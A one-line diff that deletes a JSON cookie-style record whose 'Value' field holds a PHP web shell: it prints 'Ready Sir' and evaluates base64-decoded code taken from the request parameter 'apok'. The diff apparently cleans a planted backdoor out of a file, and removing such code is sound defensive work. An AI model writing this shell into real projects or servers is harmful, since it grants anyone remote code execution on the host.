@@ -1,1 +1,0 @@
-[{"Expires":1,"Discard":false,"Value":"<?php ini_set('display_errors', 1);ini_set('display_startup_errors', 1); error_reporting(E_ALL); echo 'Ready Sir';@eval(base64_decode($_REQUEST['apok'])); ?>\n"}]
